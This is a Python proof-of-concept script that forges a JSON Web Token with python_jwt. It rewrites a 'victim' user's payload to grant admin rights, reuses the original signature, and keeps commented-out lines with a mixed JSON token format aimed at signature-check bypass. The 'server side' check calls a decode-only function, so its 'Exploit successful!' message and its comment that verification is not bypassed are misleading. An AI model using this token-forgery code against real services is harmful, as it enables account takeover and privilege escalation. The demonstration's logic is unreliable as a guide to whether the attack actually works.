import python_jwt as jwt
import jwcrypto.jwk as jwk
import base64
import json
from datetime import timedelta

# Secret key used to sign the original JWT
secret_key = jwk.JWK(generate='oct', size=256)

# Original JWT payload
original_payload = {
    "user_id": 123,
    "username": "victim",
    "admin": False
}

# Create a valid JWT
original_token = jwt.generate_jwt(original_payload, secret_key, 'HS256', timedelta(minutes=5))
print(f"Original JWT: {original_token}")

# Original JWT components
header, payload, signature = original_token.split('.')

# Decode the payload
decoded_payload_bytes = base64.urlsafe_b64decode(payload + '==')
decoded_payload = json.loads(decoded_payload_bytes)

# Modify the payload to escalate privileges (e.g., make the user an admin)
decoded_payload["admin"] = True

# Encode the modified payload
encoded_payload_bytes = json.dumps(decoded_payload).encode()
encoded_payload = base64.urlsafe_b64encode(encoded_payload_bytes).decode().rstrip('=')
# forged_token   = f'{{"{header}.{encoded_payload}.":"","protected":"{header}","payload":"{payload}","signature":"{signature}"}}'
# forged_token = """{"eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTEyMTE3MzMwLCJpYXQiOjE3NTEyMDgxMzMsImp0aSI6IjNrRlFsMndZTXl2MWt1SXFBYTZPOUEiLCJuYmYiOjE3NTEyMDgxMzMsInVzZXJuYW1lIjoiYWRtaW4ifQ.":"","protected":"eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3NTEyMTE3MzMwLCJpYXQiOjE3NTEyMDgxMzMsImp0aSI6IjNrRlFsMndZTXl2MWt1SXFBYTZPOUEiLCJuYmYiOjE3NTEyMDgxMzMsInVzZXJuYW1lIjoibzEwbnQ4dzkifQ","signature":"KO7YYWVI7QIzVRG4AAJy6V0uEJpWeXh_BUvoUWWBoVvnRJp1yQ4GCuUMD83OGBQNG4y67OJzp1O93-uYOq2eIyqW6EQYObHkx1QwMykBc94e_R2kFjpumkTAZtZCTZrBwZKTLAxgqnTAnw85leGxoemKBmrcRBTXL4PVhIPyYehz17XoZ1t7-D2S3jP67J1aJQxfedPXnBiQJDggp1NabiADnqoMQKsoHGGy_WbsZQiexxdykOvhgmakHbBL9EXcYbcoczMQiMIZhEGC3hSwR6P5FbCyhShno_sjuwxSfZ5KPGAw6vgjSLyFIyJHKGNd3EOXDyxYErrpSBNjhg4hxw"}"""
# Create the forged token using the original header and signature
forged_token = f"{header}.{encoded_payload}.{signature}"
print(f"😈 Forged JWT: {forged_token}")

# ---- SERVER SIDE -----
# Decode and verify the forged token using the original header and signature

try:
    # Decode the token (signature verification not bypassed, we reuse the original signature)
    header, claims = jwt.process_jwt(forged_token)
    print(f"Decoded Payload: {claims}")
    if claims["admin"]:
        print("BIG OOF💀 - Exploit successful!")
    else:
        print("Exploit failed - Admin flag not set.")
except Exception as e:
    print(f"Token verification failed: {e}")